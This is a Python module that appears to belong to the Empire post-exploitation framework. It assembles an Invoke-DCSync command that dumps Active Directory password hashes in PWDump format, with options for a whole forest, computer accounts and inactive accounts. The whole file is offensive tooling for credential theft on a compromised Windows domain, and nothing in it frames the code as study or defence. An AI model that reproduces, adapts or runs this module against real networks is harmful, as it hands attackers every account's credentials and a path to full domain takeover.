from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source

class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        script_end = "Invoke-DCSync -PWDumpFormat "

        if params["Domain"] != "":
            script_end += " -Domain " + params["Domain"]

        if params["Forest"] != "":
            script_end += " -DumpForest "

        if params["Computers"] != "":
            script_end += " -GetComputers "

        if params["Active"] == "":
            script_end += " -OnlyActive:$false "

        outputf = params.get("OutputFunction", "Out-String")
        script_end += f" | {outputf};"

        return script, script_end
